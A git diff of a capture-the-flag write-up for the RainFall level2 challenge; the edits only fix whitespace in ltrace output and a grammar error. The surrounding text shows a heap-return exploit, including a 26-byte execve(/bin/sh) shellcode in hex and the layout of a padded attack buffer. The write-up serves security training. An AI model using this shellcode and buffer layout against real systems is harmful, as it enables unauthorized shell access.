@@ -104,10 +104,10 @@ We can see that malloc always return the address `0x804a008` :
 ```
 level2@RainFall:~$ ltrace ./level2
 __libc_start_main(0x804853f, 1, 0xbffff7f4, 0x8048550, 0x80485c0 <unfinished ...>
-fflush(0xb7fd1a20)								= 0
-gets(0xbffff6fc, 0, 0, 0xb7e5ec73, 0x80482b5)	= 0xbffff6fc
-puts("")										= 1
-strdup("")										= 0x0804a008
+fflush(0xb7fd1a20)                               = 0
+gets(0xbffff6fc, 0, 0, 0xb7e5ec73, 0x80482b5)    = 0xbffff6fc
+puts("")                                         = 1
+strdup("")                                       = 0x0804a008
 +++ exited (status 8) +++
 level2@RainFall:~$
 ```
@@ -115,7 +115,7 @@ Now we can try to copy a shellcode in the heap by writing it in the input prompt
 Thanks to internet we'll use some Linux shellcode we found online which will run execve(/bin/sh)  
 `\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80`  
 Since our shellcode is 26 bytes long we could pad the back with any byte sequence, until 80 bytes then 4 last bytes for the return adress.  
-Our final attack buffer will looks like :  
+Our final attack buffer will look like :  
 - shellcode 			: 26 bytes
 - pad of arbitrary data : 54 bytes
 - return adress			: 4 bytes
